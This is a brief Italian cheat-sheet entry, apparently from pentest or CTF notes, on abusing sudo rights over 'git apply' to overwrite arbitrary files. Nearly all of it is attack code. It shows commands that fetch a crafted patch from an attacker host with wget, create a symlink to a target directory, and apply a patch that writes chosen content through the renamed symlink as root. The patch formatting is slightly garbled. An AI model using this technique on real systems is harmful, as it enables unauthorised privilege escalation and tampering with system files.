### **APPLY**
Se git apply ha il sudo puoi sovrascrivere i file
```bash
mkdir repo 
cd repo
wget http://<IP>/patch
git init
ln -s <PATH CARTELLA DOVE è PRESENTE IL FILE> symlink
```
Il contenuto della patch è
```PATCH
diff --git a/symlink b/renamed-symlink 
similarity index 100% 
rename from symlink rename to renamed-symlink 
-- 
diff --git /dev/null b/renamed-symlink/create-me
new file mode 100644 
index 0000000..039727e 
--- /dev/null 
+++ b/renamed-symlink/<FILE DA SCRIVERE> 
@@ -0,0 +1,1 @@ 
+<COSA DA SCRIVERE>
```
Il comando per eseguire la patch è
```bash
sudo /usr/bin/git apply patchù
```

